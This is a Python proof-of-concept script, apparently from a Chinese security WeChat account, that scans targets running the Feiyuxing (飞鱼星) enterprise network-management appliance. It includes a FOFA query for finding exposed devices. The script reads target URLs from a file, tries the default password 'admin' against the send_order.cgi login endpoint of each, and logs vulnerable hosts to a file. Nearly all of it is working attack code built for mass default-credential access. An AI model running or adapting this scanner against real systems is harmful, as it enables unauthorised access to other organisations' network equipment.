import requests
import sys
import random
import re
import base64
import time
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
        print('+------------------------------------------')
        print('+  \033[31m公众号 : 深夜笔记本                                                  \033[0m')
        print('+  \033[31mVersion: 飞鱼星                                              \033[0m')
        print('+  \033[31m使用格式:  python3 poc.py                                           \033[0m')
        print('+  \033[31mVersion: fofa：title="飞鱼星企业级智能上网行为管理系统"                  \033[0m')
        print('+  \033[31mUrl      >>> http://xxx.xxx.xxx.xxx                                \033[0m')
        print('+------------------------------------------')

def POC_1(target_url):
    url = target_url + "/send_order.cgi?parameter=login"
    data = '{"password":"admin"}'
    try:
        r = requests.post(url=url, data=data, verify=False, timeout=5)
        if "ok" in r.text and r.status_code == 200:
            print('\033[31m-\033[0m' * 50)
            print("\033[32m[o] 登陆地址 {}/home/login.html\033[0m".format(target_url))
            print('\033[36m默认密码为admin \033[0m')
            print("\n")
            print('\033[31m-\033[0m' * 50)
            f = open('./poc/vul.txt', 'a')
            f.write(url)
            f.write('\n')
        else:
            print('\033[31m-\033[0m'* 50)
            print("\033[31m[o] 注意：{}/home/login.html\033[0m".format(target_url))
            print('\033[31m 漏洞不存在\033[0m')
            print("\n")
    except:
        return


if __name__ == '__main__':
    title()
    with open('./poc/url.txt', 'r', encoding='utf-8') as f:
        for i in f.readlines():
            s = i.strip()
            target_url = s
            POC_1(target_url)
